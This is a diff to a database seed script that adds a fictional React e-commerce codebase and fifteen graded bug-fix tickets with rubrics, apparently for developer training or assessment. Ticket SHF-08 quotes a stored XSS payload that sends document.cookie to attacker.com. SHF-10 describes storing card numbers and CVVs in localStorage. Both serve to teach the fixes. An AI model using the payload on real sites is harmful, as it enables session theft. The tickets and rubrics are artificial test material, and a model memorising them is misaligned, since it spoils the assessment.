@@ -1349,8 +1349,418 @@ This exposes internal file paths, line numbers, and the tech stack to anyone mak
     });
   }
 
+  // ── ShopFront codebase ────────────────────────────────────────────────────
+  const shopfrontCodebase = await prisma.codebase.upsert({
+    where: { id: "shopfront-seed-id-001" },
+    update: {},
+    create: {
+      id: "shopfront-seed-id-001",
+      name: "ShopFront",
+      stack: Stack.REACT,
+      repoUrl: "https://github.com/OSSAMA-prog-droid/shopfront",
+      description: "A React 18 + TypeScript e-commerce storefront with Vite, React Router v6, and Axios. Powers a mid-market marketplace serving 40,000 daily active shoppers.",
+      companyLore: `ShopFront is a consumer e-commerce platform that launched its React frontend 18 months ago after migrating from a server-rendered PHP monolith. The migration was completed under a hard deadline to meet a Black Friday launch and several architectural shortcuts were taken.
+
+The engineering team is 8 developers across two squads: Storefront (4 devs) and Platform (4 devs). The Storefront squad owns the React codebase. Technical debt has accumulated in the hooks layer and context architecture.
+
+Key facts engineers must know:
+- All application state — cart, user, UI flags — lives in a single ShopContext. Every cart update re-renders the entire tree including 50+ product cards on the listing page
+- WebSocket connections are opened for live price updates on every product page visit but are never closed. After 10 visits, 10 sockets are active simultaneously
+- The auto-save cart interval captures a stale closure — it always POSTs the initial empty cart regardless of what the user has added
+- Payment details including CVV and card number are stored in localStorage, accessible to any third-party script on the domain
+- Cart totals use raw floating point arithmetic — 3 items at £19.99 = £59.970000000000006 in the checkout UI
+- The infinite scroll component fires duplicate API requests when the user scrolls quickly because there is no in-flight guard
+
+Production incidents in the last 30 days:
+- Double orders: 23 customers were charged twice on Black Friday due to the missing submit guard on CheckoutForm
+- Memory warning: React "Can't perform a state update on an unmounted component" floods Sentry — caused by stale WebSocket handlers
+- Empty order history: Users who log in and navigate to /orders see no orders because the useEffect is missing the user dependency`,
+    },
+  });
+
+  const shopfrontTickets = [
+    {
+      id: "ticket-shf-01-seed-id-001",
+      title: "SHF-01: Auto-Save Cart Always Sends Empty Cart to Server",
+      description: `Customer support has received complaints from users who add items to their cart, leave the page, and return to find the cart is empty on the server — even though localStorage has the correct items. The 30-second auto-save interval is firing but POSTing an empty cart.
+
+**What's happening:**
+\`useCartSync()\` in \`src/hooks/useCart.ts\` sets up a \`setInterval\` that posts \`cart\` to the server. But the interval callback captures \`cart\` from the initial render (empty array). Even after the user adds items, the interval always POSTs the empty cart. A \`cartRef\` is updated on every render but the interval reads the raw \`cart\` variable, not the ref.
+
+**Your task:**
+1. Fix the interval callback in \`useCartSync()\` to read \`cartRef.current\` instead of the stale \`cart\` closure variable
+2. Do NOT add \`cart\` to the \`useEffect\` dependency array — that would restart the interval on every cart change
+3. After the fix, adding 3 items and waiting 30 seconds should result in a POST with all 3 items
+
+**Files:** \`src/hooks/useCart.ts\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/hooks/useCart.ts"],
+      rubric: {
+        diagnosis: "Did they identify that setInterval captures the initial cart value and never updates? Did they find the cartRef that is already kept up-to-date but never used inside the interval?",
+        design: "Did they replace `cart` with `cartRef.current` inside the interval callback? Did they avoid adding cart to the deps array (which would recreate the interval on every change)?",
+        communication: "Did they explain the stale closure mechanism — the interval forms a closure over `cart` at the time the effect runs, and that value never changes inside the closure?",
+        execution: "Does the interval now POST the current cart contents after items are added? Is the interval still created only once when userId changes (not on every cart update)?",
+      },
+      expectedMinutes: 25,
+    },
+    {
+      id: "ticket-shf-02-seed-id-002",
+      title: "SHF-02: Search Results Show Stale Data When Typing Fast",
+      description: `Users typing quickly in the search box report seeing results flash briefly and then revert to results for an earlier query. For example, typing "camera" shows "Camera Model X" for a moment, then switches to results for "cam" — a slower request from earlier that resolved after the faster one.
+
+**What's happening:**
+\`useSearch()\` in \`src/hooks/useSearch.ts\` fires an axios request on every query change but has no \`AbortController\`. If the user types "cam" (request A, slow) then "camera" (request B, fast), request B resolves first and sets correct results. Request A then resolves and overwrites them with stale results.
+
+**Your task:**
+1. Create an \`AbortController\` at the top of the \`useEffect\`
+2. Pass \`signal: controller.signal\` to the axios config
+3. In the cleanup function: \`return () => controller.abort()\`
+4. In the catch block, check \`axios.isCancel(err)\` and skip \`setError\` / \`setLoading(false)\` if the request was cancelled
+
+**Files:** \`src/hooks/useSearch.ts\``,
+      difficulty: Difficulty.MID,
+      filesInvolved: ["src/hooks/useSearch.ts"],
+      rubric: {
+        diagnosis: "Did they identify the race condition — slow response for an older query arriving after a faster response for a newer query? Did they understand that the fix must cancel in-flight requests, not just ignore results?",
+        design: "Did they use AbortController? Did they pass the signal to axios? Did they abort in the cleanup function? Did they handle the cancelled request in catch (skip setError for AbortError)?",
+        communication: "Did they explain why checking response order is insufficient — cancellation prevents the network work entirely, saving bandwidth and CPU? Did they describe the exact race scenario?",
+        execution: "Does an in-flight request get cancelled when the query changes? Does the stale response never reach setResults? Does loading correctly reset when the cancelled request's catch is handled?",
+      },
+      expectedMinutes: 30,
+    },
+    {
+      id: "ticket-shf-03-seed-id-003",
+      title: "SHF-03: Memory Leak — WebSocket Connections Never Closed",
+      description: `Sentry is logging hundreds of "Can't perform a state update on an unmounted component" warnings per hour. Memory profiling shows WebSocket connections accumulating — after visiting 10 product pages, there are 10 active WebSocket connections all firing \`setLivePrice\` and \`setPriceChange\` on components that were unmounted long ago.
+
+**What's happening:**
+\`usePriceUpdates()\` in \`src/hooks/usePriceUpdates.ts\` opens a \`new WebSocket()\` on mount but the \`useEffect\` returns no cleanup function. When the user navigates away, the component unmounts but the WebSocket stays open. Every price update it receives calls \`setState\` on the unmounted component.
+
+**Your task:**
+1. Add a cleanup function to the \`useEffect\`: \`return () => ws.close()\`
+2. That's the entire fix — one line
+3. Verify: visiting 10 product pages in sequence should result in exactly 1 active WebSocket at any time (the current page's), not 10
+
+**Files:** \`src/hooks/usePriceUpdates.ts\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/hooks/usePriceUpdates.ts"],
+      rubric: {
+        diagnosis: "Did they find the missing cleanup return in the useEffect? Did they understand that React calls the cleanup function on unmount and that WebSocket.close() stops both the connection and its callbacks?",
+        design: "Did they add `return () => ws.close()` inside the useEffect? Is it placed after the ws.onmessage and ws.onerror assignments so ws is in scope?",
+        communication: "Did they explain the sequence: mount → open WebSocket → unmount → no cleanup → setState on dead component → React warning? Did they note this is also a memory leak (the WebSocket object is retained)?",
+        execution: "Does navigating between product pages result in previous WebSocket connections being closed? Are there no more 'state update on unmounted component' warnings from this hook?",
+      },
+      expectedMinutes: 15,
+    },
+    {
+      id: "ticket-shf-04-seed-id-004",
+      title: "SHF-04: Order History Page Always Empty After Login",
+      description: `Users navigate to /orders after logging in and always see "No orders found" even when they have a full order history. Refreshing the page shows orders correctly. The issue only occurs when the user navigates to /orders from the login flow — not on a fresh page load where they're already authenticated.
+
+**What's happening:**
+The \`useEffect\` in \`OrderHistoryPage.tsx\` has an empty dependency array \`[]\`. When the component mounts before login, \`user\` is null and the fetch is skipped. When the user logs in and \`user\` changes, the effect never re-runs because \`user\` is not in the deps array.
+
+**Your task:**
+1. Add \`user\` (or \`user?.id\`) to the \`useEffect\` dependency array in \`OrderHistoryPage.tsx\`
+2. The effect already handles the null case (\`if (!user?.id) return;\`) so no other change is needed
+3. After the fix, navigating to /orders after login must trigger a fresh fetch
+
+**Files:** \`src/pages/OrderHistoryPage.tsx\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/pages/OrderHistoryPage.tsx"],
+      rubric: {
+        diagnosis: "Did they find the empty useEffect dep array and understand that it prevents re-running when user changes? Did they confirm the null guard is already present and the only missing piece is the dependency?",
+        design: "Did they add `user` or `user?.id` to the dep array? Did they avoid adding unnecessary deps (e.g. the entire setOrders function)?",
+        communication: "Did they explain why the bug only appears after login (vs page refresh where user is already set when the component mounts)? Did they note this is a common React pitfall?",
+        execution: "Does the effect re-run when user changes from null to a logged-in user? Are orders fetched and displayed after navigating from the login page?",
+      },
+      expectedMinutes: 15,
+    },
+    {
+      id: "ticket-shf-05-seed-id-005",
+      title: "SHF-05: Cart Totals Show Floating Point Errors in Checkout",
+      description: `Finance reported that the checkout page occasionally shows totals like £59.970000000000006 and £127.49000000000001. Screenshots from 3 customers this week. The amounts are correct to 2 decimal places in the database — the corruption happens client-side during total calculation.
+
+**What's happening:**
+\`calculateCartTotal()\` in \`src/utils/price.ts\` uses \`item.price * item.quantity\` with raw JavaScript floating point. \`3 * 19.99 = 59.970000000000006\` in IEEE 754. The raw float is displayed directly in the UI.
+
+**Your task:**
+1. Fix \`calculateCartTotal()\` to return a value rounded to 2 decimal places
+2. Use integer arithmetic to avoid accumulation: multiply each price by 100 (pennies), sum as integers, then divide by 100
+3. Alternative: use \`Math.round(sum * 100) / 100\` at the end — either approach is acceptable
+4. Ensure \`formatPrice()\` also passes the rounded value to Intl.NumberFormat
+
+**Files:** \`src/utils/price.ts\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/utils/price.ts"],
+      rubric: {
+        diagnosis: "Did they identify IEEE 754 floating point as the cause? Did they understand that the error accumulates across multiple items and becomes visible at 2+ decimal places?",
+        design: "Did they use integer arithmetic (pence/cents), Math.round, or parseFloat(total.toFixed(2)) to cap the precision? Did they apply the fix at the reduce step, not just at display time?",
+        communication: "Did they explain that the database stores correct values but the client-side calculation corrupts them? Did they recommend the integer arithmetic approach as safer than toFixed for multi-item carts?",
+        execution: "Does calculateCartTotal() return exactly 59.97 for 3 × £19.99? Does a cart with 10 × £0.10 items return exactly £1.00?",
+      },
+      expectedMinutes: 20,
+    },
+    {
+      id: "ticket-shf-06-seed-id-006",
+      title: "SHF-06: Removing an Item from Cart Removes the Wrong Item",
+      description: `Users report that when they remove an item from the middle of their cart, a different item disappears. For example: cart has [Widget A, Widget B, Widget C]. User clicks Remove on Widget B. Widget C disappears instead. This only happens when items have been added in different sessions or when variant selection is involved.
+
+**What's happening:**
+\`CartItemList\` in \`src/components/Cart/CartItem.tsx\` renders list items with \`key={index}\`. When Widget B is removed, the array becomes [Widget A, Widget C]. React sees index 0 and 1 still exist — it reuses the DOM nodes from the original positions, and the component state (quantity inputs, focus) from index 1 (Widget B's node) is now on Widget C's data.
+
+**Your task:**
+1. Replace \`key={index}\` with a stable unique key: \`key={\`\${item.productId}-\${item.variantId ?? 'null'}\`}\`
+2. This applies to the \`<li>\` element in the \`.map()\` callback
+3. After the fix, removing Widget B must correctly remove Widget B and leave Widget A and Widget C intact
+
+**Files:** \`src/components/Cart/CartItem.tsx\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/components/Cart/CartItem.tsx"],
+      rubric: {
+        diagnosis: "Did they identify key={index} as the root cause? Did they explain the React reconciliation mechanism — when items shift positions, index-keyed nodes are reused for the wrong data?",
+        design: "Did they use a stable identifier derived from productId + variantId? Did they handle the null variantId case (products without variants)?",
+        communication: "Did they explain when index keys are safe (static, never reordered, never deleted) and why cart items are exactly the wrong use case?",
+        execution: "After removing Widget B from [A, B, C], does [A, C] remain with correct quantities and input values? Does no re-render confusion occur?",
+      },
+      expectedMinutes: 15,
+    },
+    {
+      id: "ticket-shf-07-seed-id-007",
+      title: "SHF-07: Double-Click on Place Order Creates Duplicate Orders",
+      description: `In the last month, 23 customers were charged twice. Support confirmed all cases: user clicked Place Order, it appeared to hang (slow API response), user clicked again, two orders were created and two charges appeared on their statement. Stripe logs confirm two separate PaymentIntent creates.
+
+**What's happening:**
+\`CheckoutForm\` in \`src/components/Checkout/CheckoutForm.tsx\` has a \`submitting\` state variable declared but it is never set to \`true\`. The submit button is never actually disabled during submission, so rapid clicks fire multiple \`POST /checkout\` requests.
+
+**Your task:**
+1. Change \`const [submitting] = useState(false)\` to \`const [submitting, setSubmitting] = useState(false)\`
+2. At the start of \`handleSubmit\`: add \`if (submitting) return; setSubmitting(true);\`
+3. In the \`finally\` block (add one if needed): \`setSubmitting(false)\`
+4. The submit button already has \`disabled={submitting}\` — it just needs submitting to actually become true
+
+**Files:** \`src/components/Checkout/CheckoutForm.tsx\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/components/Checkout/CheckoutForm.tsx"],
+      rubric: {
+        diagnosis: "Did they find the destructured useState that discards the setter (\`const [submitting] = useState\`)? Did they understand this means submitting is permanently false and the button is never disabled?",
+        design: "Did they add the setter to the destructuring? Did they add the guard at the top of handleSubmit (if submitting return)? Did they reset submitting in a finally block so it's reset even on error?",
+        communication: "Did they explain the business impact (duplicate charges) and why this is a high-priority fix? Did they mention server-side idempotency keys as an additional layer of protection?",
+        execution: "Does clicking Place Order twice only create one order? Is the button visually disabled during submission? Is submitting reset to false after the request completes or fails?",
+      },
+      expectedMinutes: 20,
+    },
+    {
+      id: "ticket-shf-08-seed-id-008",
+      title: "SHF-08: Product Description Renders Raw HTML — XSS Vulnerability",
+      description: `The security team found that seller accounts can execute JavaScript in buyer browsers by injecting it into the product description field. Payload: \`<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">\`. This was tested in staging and confirmed: the attacker's server received the buyer's session cookie.
+
+**What's happening:**
+\`ProductDetail\` in \`src/components/Product/ProductDetail.tsx\` renders the product description using \`dangerouslySetInnerHTML={{ __html: product.description }}\`. Any HTML in the description is rendered and executed by the browser.
+
+**Your task:**
+1. Replace \`dangerouslySetInnerHTML\` with safe text rendering
+2. If rich text formatting is required, use the \`DOMPurify\` library to sanitise the HTML before rendering: \`import DOMPurify from 'dompurify'; <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description) }} />\`
+3. If plain text is sufficient, simply use \`<p>{product.description}</p>\` and remove \`dangerouslySetInnerHTML\` entirely
+4. Add \`dompurify\` to package.json if you use the sanitised approach
+
+**Files:** \`src/components/Product/ProductDetail.tsx\``,
+      difficulty: Difficulty.MID,
+      filesInvolved: ["src/components/Product/ProductDetail.tsx"],
+      rubric: {
+        diagnosis: "Did they find the dangerouslySetInnerHTML and classify it as an XSS vulnerability? Did they understand that the attack surface is the description field editable by merchants/sellers?",
+        design: "Did they either remove dangerouslySetInnerHTML entirely (simplest) or add DOMPurify sanitisation (preserves formatting)? Did they choose the appropriate approach based on whether rich text is needed?",
+        communication: "Did they classify this as a stored XSS vulnerability? Did they explain the attack chain — malicious seller injects script, buyer views product, script runs in buyer's browser with buyer's session?",
+        execution: "Does the fix prevent script tags and event handlers from executing? If DOMPurify is used, is it applied before the HTML reaches the DOM? Does legitimate formatting (bold, lists) still render if DOMPurify approach is chosen?",
+      },
+      expectedMinutes: 25,
+    },
+    {
+      id: "ticket-shf-09-seed-id-009",
+      title: "SHF-09: Adding to Cart Re-Renders Entire Page Including 50+ Product Cards",
+      description: `Performance profiling shows that clicking "Add to Cart" on a product triggers 60–80 component re-renders. On the product listing page with 50 cards, every single card re-renders even though they are purely read-only. The cart button latency is 340ms on a mid-range device — industry standard for e-commerce is under 100ms.
+
+**What's happening:**
+\`ShopContext\` in \`src/context/ShopContext.tsx\` holds all application state: cart, user, UI flags, and all action handlers. When cart state changes, React re-renders every component that calls \`useShop()\`, including all 50 product cards on the listing page.
+
+**Your task:**
+1. Split the single context into two: \`CartContext\` (cart, addToCart, removeFromCart, updateQuantity, clearCart) and \`UserContext\` (user, isMenuOpen, isCartOpen, setUser, setMenuOpen, setCartOpen)
+2. Move to \`src/context/CartContext.tsx\` and \`src/context/UserContext.tsx\`
+3. Update \`ShopContext.tsx\` to re-export from both for backwards compatibility, or update all \`useShop()\` call sites to use the specific context
+4. After the fix, adding to cart should only re-render components that consume CartContext — not ProductCard components that only need UserContext
+
+**Files:** \`src/context/ShopContext.tsx\``,
+      difficulty: Difficulty.SENIOR,
+      filesInvolved: ["src/context/ShopContext.tsx"],
+      rubric: {
+        diagnosis: "Did they identify the monolithic context as the cause of excessive re-renders? Did they trace that ProductCard consumes useShop() but only needs addToCart — not cart state itself?",
+        design: "Did they split into at least two contexts with logical separation? Did they ensure backwards compatibility or update all call sites? Did they consider useContextSelector as an alternative approach?",
+        communication: "Did they explain the re-render propagation mechanism — any context value change triggers all consumers? Did they quantify the improvement (50+ cards → 0 unnecessary re-renders on cart update)?",
+        execution: "Does adding to cart no longer trigger re-renders of product cards? Is the context split clean with no circular imports? Do all existing features still work after the refactor?",
+      },
+      expectedMinutes: 60,
+    },
+    {
+      id: "ticket-shf-10-seed-id-010",
+      title: "SHF-10: Credit Card Details Including CVV Stored in localStorage",
+      description: `A security researcher reported via responsible disclosure that saved payment details — including the full card number, CVV, and expiry date — are readable from \`localStorage\` by any JavaScript on the page. Our site loads 4 third-party scripts (Google Analytics, Hotjar, a chat widget, and an ad pixel). Any of these, or any XSS vulnerability on any page of our domain, can exfiltrate every saved card.
+
+**What's happening:**
+\`savePaymentDetails()\` in \`src/utils/storage.ts\` writes \`{ cardNumber, cardHolder, expiry, cvv, billingAddress }\` directly to \`localStorage\`. This is accessible to any JS on the domain. CVV must never be stored — PCI DSS prohibits it. Card numbers must not be stored client-side.
+
+**Your task:**
+1. Remove \`savePaymentDetails()\` and \`loadPaymentDetails()\` from \`storage.ts\`
+2. Remove the "Save card for future purchases" checkbox and all related logic from \`PaymentForm.tsx\`
+3. If saved cards are needed, the card must be tokenised server-side and only the last 4 digits + brand returned to the client for display
+4. Never store CVV anywhere — not localStorage, not a database, not logs
+
+**Files:** \`src/utils/storage.ts\`, \`src/components/Checkout/PaymentForm.tsx\``,
+      difficulty: Difficulty.MID,
+      filesInvolved: ["src/utils/storage.ts", "src/components/Checkout/PaymentForm.tsx"],
+      rubric: {
+        diagnosis: "Did they identify localStorage as accessible to third-party scripts? Did they classify the CVV storage as a PCI DSS violation specifically (CVV must never be stored)?",
+        design: "Did they remove savePaymentDetails entirely? Did they explain server-side tokenisation as the correct approach for saved cards? Did they remove the save-card UI?",
+        communication: "Did they mention PCI DSS and explain which data elements are prohibited? Did they explain the threat model — any XSS anywhere on the domain can exfiltrate all saved cards?",
+        execution: "Is savePaymentDetails removed? Is the save card checkbox removed from PaymentForm? Is no sensitive payment data written to localStorage?",
+      },
+      expectedMinutes: 30,
+    },
+    {
+      id: "ticket-shf-11-seed-id-011",
+      title: "SHF-11: Search Bar Never Actually Searches — Submit Handler Is Stale",
+      description: `QA filed a P1: the search bar on the home page does not work at all. Typing "camera" and pressing Enter shows results for an empty query. All search results returned are the same as the initial state — as if the search term was "". This affects 100% of users who use the search form.
+
+**What's happening:**
+\`ProductSearch\` in \`src/components/Product/ProductSearch.tsx\` wraps \`onSubmit\` in \`useCallback\` with an empty dep array \`[]\`. The closure captures \`inputValue\` from the first render, which is \`""\`. Typing updates local state but \`onSubmit\` always calls \`setQuery("")\`.
+
+**Your task:**
+1. Remove the \`useCallback\` wrapper from \`onSubmit\` — it provides no benefit here and causes the bug
+2. Alternatively, add \`inputValue\` to the \`useCallback\` dep array: \`useCallback(fn, [inputValue])\`
+3. The simplest fix is option 1 — just define \`onSubmit\` as a plain function
+
+**Files:** \`src/components/Product/ProductSearch.tsx\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/components/Product/ProductSearch.tsx"],
+      rubric: {
+        diagnosis: "Did they find that useCallback with [] dep array creates a closure over the initial empty inputValue? Did they understand that setQuery(inputValue) always submits '' because inputValue is stale in the closure?",
+        design: "Did they either remove useCallback or add inputValue to deps? Did they choose the simpler fix (remove useCallback)?",
+        communication: "Did they explain when useCallback is beneficial (stable reference for memoized children) vs harmful (causes stale closures when deps are incomplete)?",
+        execution: "Does submitting the search form with 'camera' typed actually search for 'camera'? Does the stale closure no longer submit an empty string?",
+      },
+      expectedMinutes: 15,
+    },
+    {
+      id: "ticket-shf-12-seed-id-012",
+      title: "SHF-12: Failed Add-to-Cart Leaves Ghost Item in Cart",
+      description: `Users are reporting they see items in their cart that they cannot buy. Attempting to checkout with these items fails at the server. Support investigation reveals: the user added an item that was out of stock on the server (stock depleted between page load and add). The UI shows the item in cart because of the optimistic update, but the server rejected the add and the UI was never rolled back.
+
+**What's happening:**
+\`addToCartWithSync()\` in \`src/hooks/useCart.ts\` calls \`addToCart(item)\` immediately (optimistic update) then fires the API request. In the catch block, the error is logged but \`removeFromCart()\` is never called. The item stays in the UI cart permanently.
+
+**Your task:**
+1. In the catch block of \`addToCartWithSync()\`, call \`removeFromCart(item.productId, item.variantId)\` to roll back the optimistic update
+2. Also show a user-visible error (you can use a simple \`alert()\` or set an error state) so the user understands the item was not added
+3. Do not change the optimistic add — keeping it fast is intentional
+
+**Files:** \`src/hooks/useCart.ts\``,
+      difficulty: Difficulty.MID,
+      filesInvolved: ["src/hooks/useCart.ts"],
+      rubric: {
+        diagnosis: "Did they find the empty catch block that logs but does not rollback? Did they understand the optimistic update pattern and why rollback is necessary on server rejection?",
+        design: "Did they call removeFromCart in the catch block? Did they handle the error UX (toast, alert, or error state)? Did they preserve the optimistic add behaviour for the happy path?",
+        communication: "Did they explain the optimistic update pattern and its requirements — fast UI update + guaranteed rollback on failure? Did they note that ghost items can cause customer frustration and lost trust?",
+        execution: "Does a server rejection of cart/add result in the item being removed from the UI cart? Is an error message shown to the user? Does the happy path (server accepts) still work?",
+      },
+      expectedMinutes: 20,
+    },
+    {
+      id: "ticket-shf-13-seed-id-013",
+      title: "SHF-13: Scrolling Fast on Products Page Loads Duplicate Results",
+      description: `The product listing page uses infinite scroll. Users who scroll quickly to the bottom see duplicate product cards — the same products appear twice (or more) in the list. Investigation shows the server receives duplicate requests for the same page number from the same client.
+
+**What's happening:**
+\`InfiniteScroll\` in \`src/components/shared/InfiniteScroll.tsx\` uses an \`IntersectionObserver\` that calls \`loadMore()\` when the sentinel element is visible. If the user scrolls quickly and the observer fires multiple times before \`loadMore()\` resolves, multiple concurrent calls are made. The \`loading\` state is missing from the \`useCallback\` dep array — it's always stale \`false\` inside the handler.
+
+**Your task:**
+1. Add a ref-based in-flight guard: \`const loadingRef = useRef(false)\`
+2. At the start of the observer callback: \`if (loadingRef.current || !hasMore) return\`
+3. Before calling \`loadMore()\`: \`loadingRef.current = true\`
+4. In the finally block: \`loadingRef.current = false\`
+5. Use a ref (not state) because state updates are async and won't prevent re-entrant calls within the same tick
+
+**Files:** \`src/components/shared/InfiniteScroll.tsx\``,
+      difficulty: Difficulty.MID,
+      filesInvolved: ["src/components/shared/InfiniteScroll.tsx"],
+      rubric: {
+        diagnosis: "Did they identify that loadMore is called multiple times because loading state is stale in the useCallback closure? Did they understand that useState updates are async and can't prevent re-entrant calls in the same tick?",
+        design: "Did they use a ref (not state) for the in-flight guard? Is the guard checked before calling loadMore? Is it reset in a finally block? Does the solution prevent the observer from firing again while the first call is pending?",
+        communication: "Did they explain why useRef is necessary instead of useState for this guard (synchronous check vs async state update)? Did they note the dep array bug as a contributing cause?",
+        execution: "Does fast scrolling no longer produce duplicate API requests? Does the ref guard prevent re-entrant loadMore calls? Is the guard correctly reset after the call resolves or rejects?",
+      },
+      expectedMinutes: 30,
+    },
+    {
+      id: "ticket-shf-14-seed-id-014",
+      title: "SHF-14: Product Page Shows Infinite Loading Spinner on 404",
+      description: `When a user navigates to a product URL that no longer exists (deleted product, old bookmark, bad link from an email campaign), they see a loading spinner that never goes away. There is no error message, no redirect, no "product not found" page. The spinner just sits there forever.
+
+**What's happening:**
+The async IIFE in \`ProductPage.tsx\`'s \`useEffect\` has no \`try/catch\`. When axios throws a 404, the unhandled rejection is swallowed. \`setLoading(false)\` is never called, so the spinner persists. \`setProduct\` is never called, so the "Product not found" fallback is never reached.
+
+**Your task:**
+1. Wrap the async IIFE body in \`try/catch\`
+2. In the catch block: call \`setLoading(false)\` and set an error state (\`setError(err.message)\` or similar)
+3. Add an error render branch: if error, show "Product not found" or the error message
+4. After the fix, a 404 response must show a user-friendly message within the normal request timeout
+
+**Files:** \`src/pages/ProductPage.tsx\``,
+      difficulty: Difficulty.JUNIOR,
+      filesInvolved: ["src/pages/ProductPage.tsx"],
+      rubric: {
+        diagnosis: "Did they find the missing try/catch in the async IIFE? Did they trace that setLoading(false) is only called in the happy path, leaving loading=true permanently on error?",
+        design: "Did they add try/catch? Did they call setLoading(false) in catch or finally? Did they add an error state and render branch?",
+        communication: "Did they explain that async IIFEs without try/catch produce unhandled Promise rejections that are silently swallowed in production? Did they note this is a common React data-fetching pitfall?",
+        execution: "Does a 404 response result in the spinner stopping and an error message appearing? Does loading reset to false in all code paths (success and error)?",
+      },
+      expectedMinutes: 20,
+    },
+    {
+      id: "ticket-shf-15-seed-id-015",
+      title: "SHF-15: Filter and Sort Selections Are Lost on Browser Back",
+      description: `Users browse to Products, select "Electronics" category and "Price: Low to High" sort, scroll through several pages of results, then click a product. When they hit the browser Back button, the category and sort are reset to defaults — they have to re-apply their filters and scroll back to where they were. Sales analysis also shows that filtered product URLs cannot be shared (share button always links to unfiltered view).
+
+**What's happening:**
+\`ProductList\` in \`src/components/Product/ProductList.tsx\` stores \`sort\` and \`categoryFilter\` in local \`useState\`. These are not reflected in the URL, so browser history has no way to restore them. Deep-linking is impossible and Back button loses the state.
+
+**Your task:**
+1. Replace \`useState\` for \`sort\` and \`categoryFilter\` with \`useSearchParams\` from \`react-router-dom\`
+2. Read initial values: \`const sort = searchParams.get('sort') ?? 'name'\`
+3. On change: \`setSearchParams({ sort: newSort, category: newCategory })\` — this updates the URL without a full navigation
+4. After the fix, the URL should reflect the current filters and the Back button should restore the previous filter state
+
+**Files:** \`src/components/Product/ProductList.tsx\``,
+      difficulty: Difficulty.MID,
+      filesInvolved: ["src/components/Product/ProductList.tsx"],
+      rubric: {
+        diagnosis: "Did they identify local useState as the cause of lost state on navigation? Did they understand that URL params are the correct mechanism for shareable, history-aware filter state in React Router?",
+        design: "Did they replace useState with useSearchParams? Did they read from params with a fallback default? Did they update params on change using setSearchParams?",
+        communication: "Did they explain why URL state is better than component state for filters (shareable, bookmarkable, Back-button-aware)? Did they mention that this also fixes the share button?",
+        execution: "Does changing the sort and navigating to a product then hitting Back restore the sort selection? Does the URL reflect the active filters? Can a filtered URL be shared and load with the correct filters applied?",
+      },
+      expectedMinutes: 30,
+    },
+  ];
+
+  for (const t of shopfrontTickets) {
+    await prisma.ticket.upsert({
+      where: { id: t.id },
+      update: {},
+      create: { ...t, stack: Stack.REACT, codebaseId: shopfrontCodebase.id },
+    });
+  }
+
   await prisma.$disconnect();
   console.log(
-    `[seed] Done — ${tickets.length} NovaTech + ${sdTickets.length} SD + ${ragTickets.length} RAGCore + ${techCorpTickets.length} TechCorp tickets upserted.`
+    `[seed] Done — ${tickets.length} NovaTech + ${sdTickets.length} SD + ${ragTickets.length} RAGCore + ${techCorpTickets.length} TechCorp + ${shopfrontTickets.length} ShopFront tickets upserted.`
   );
 }
